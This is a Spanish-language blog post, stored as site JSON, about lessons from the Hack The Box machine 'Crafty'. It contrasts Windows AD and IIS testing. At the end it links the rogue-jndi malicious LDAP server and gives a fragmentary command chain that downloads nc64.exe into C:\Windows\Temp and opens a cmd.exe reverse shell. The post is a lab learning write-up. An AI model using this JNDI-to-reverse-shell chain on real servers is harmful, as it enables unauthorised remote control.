{"componentChunkName":"component---node-modules-gatsby-theme-portfolio-minimal-src-templates-article-index-tsx","path":"/htb-crafty/","result":{"pageContext":{"article":{"banner":{"alt":"Two Kings of chess, white & black","caption":"Photo by <a href=\"https://unsplash.com/@rn2917\">Unsplash</a>","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAcIBf/EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAUu5qz1CZS5A/8QAGhAAAwEBAQEAAAAAAAAAAAAABAUGAwcBAv/aAAgBAQABBQLpvm/xU9VzKGXJ17bVO0ippuXQyKivxCWiLwv/xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAmEAABAwMDAwUBAAAAAAAAAAACAQMEBRESABMhFCMxBkFRYXGC/9oACAEBAAY/AvTYutk0Rxo+3l5W9UVLp/XH7qmHKa2wKpPCKqt7l0hLbj61SXGo+TZ02GQFmnIqyKj7fGoVUqtMCozoYt9K9KdfLZwe3xQBF0AxR7uYqKpfzqPGrnVyGY75SGQalORsHibVtS7OKrcFx5vqJAjN4xoUZmLHElUyFlgEbbRTK5GuIpciVVVeV1//xAAaEAEBAAMBAQAAAAAAAAAAAAABEQAhQTFR/9oACAEBAAE/IUzdEmrZLyfRhZQFMKo694ZiSVfk8bGU1QrHl2EV3CMwuQ+8E7cVDEdA7xl0JNHNXYRkVz//2gAMAwEAAgADAAAAEOAP/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPxA//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPxA//8QAGRABAQEAAwAAAAAAAAAAAAAAAREAITFR/9oACAEBAAE/EBykix6SAo0A0Ap32VT5OQBuoBoDTZRBtDIKz3c1cdNuRrRGlzVSPhhbeMVpBxsTBSjYDLTGHf/Z"},"images":{"fallback":{"src":"/static/1feb9f628cf7e719446aa399f35d49c6/91671/ad-vs-iis.jpg","srcSet":"/static/1feb9f628cf7e719446aa399f35d49c6/7e3b4/ad-vs-iis.jpg 165w,\n/static/1feb9f628cf7e719446aa399f35d49c6/47f88/ad-vs-iis.jpg 330w,\n/static/1feb9f628cf7e719446aa399f35d49c6/91671/ad-vs-iis.jpg 660w,\n/static/1feb9f628cf7e719446aa399f35d49c6/5aaff/ad-vs-iis.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/1feb9f628cf7e719446aa399f35d49c6/322ad/ad-vs-iis.webp 165w,\n/static/1feb9f628cf7e719446aa399f35d49c6/de3b3/ad-vs-iis.webp 330w,\n/static/1feb9f628cf7e719446aa399f35d49c6/2b2b5/ad-vs-iis.webp 660w,\n/static/1feb9f628cf7e719446aa399f35d49c6/e36a7/ad-vs-iis.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Que aprendi de la maquina Crafty</h1>\n<p>Si comparamos las maquinas Cicada y Crafty vemos que ambas pertenecen al entorno Windows, pero con una grandisima diferencia: AD vs IIS.</p>\n<p>Quiza porque sean ambas faciles podemos ver una diferencia clara, en el entorno AD testeamos la red y los privilegios, moviendonos por distintos servicios y usuarios con distintas responsabilidades. En el entorno IIS vemos similitudes con Privesc en Linux, es decir, a groso modo, un servidor y un binario inseguro.</p>\n<p>Desde este punto de vista puedo trazar una distinsion clara entre testear AD y IIS si bien ambos son Windows, si bien son solo dos ejemplos, tiene sentido pensar que al enfrentar un AD se testee lo que en esencia es AD, redes, servicios y contenido distribuido. Y de ahi, que cambiemos el mindset cuando nos enfrentemos a algo que no es AD.</p>\n<p>Entonces, siguiendo esta vision, tiene sentido que pensemos en testear un servidor cuando nos enfrentamos a IIS, ya que eso es (y lo pienso de este modo quiza por deformacion al entender el mundo desde Linux). IIS si bien es Windows al igual que AD, y claro puede tener las mismas vias, cumple funciones muy diferentes y vistolo asi, el testeo es mas a nivel sistema que nivel red.</p>\n<blockquote>\n<p>Y todo esto lo pense mientras le daba la tabarra a una persona que no le interesaba la ciber seguridad...</p>\n</blockquote>\n<h2>A malicious LDAP server for JNDI injection attacks</h2>\n<blockquote>\n<p><a href=\"https://github.com/veracode-research/rogue-jndi\">https://github.com/veracode-research/rogue-jndi</a></p>\n</blockquote>\n<p>En esta maquina vemos una variante de una tecnica comun en Linux, montar un servidor malicioso para redireccionar hacia un recurso malicioso (un reverse shell en este caso) una peticion realizada por un servidor legitimo.</p>\n<p>En este lab, un IIS levanta un servidor de Minecraft al que forzamos a realizar una peticion a nuestro servidor LDAP (ya que nos encontramos en un entorno Windows).</p>\n<p>El flow fue asi:</p>\n<ul>\n<li><code class=\"language-text\">Victim Server --> Evil LDAP --> http.server &amp; -o C:\\Windows\\Temp\\nc64.exe -e cmd.exe attr_addr</code></li>\n</ul>","categories":["IIS","AD"],"date":"January 03, 2026","description":"Windows AD vs Windows IIS","id":"8910d4a9-e8b6-5ea2-a693-b79d5499498b","keywords":["Active Directory","Internet Information Services"],"slug":"/htb-crafty/","title":"AD vs IIS","readingTime":{"text":"2 min read"}},"listingPagePath":"/blog"}},"staticQueryHashes":["3262260831","948380417"],"slicesMap":{}}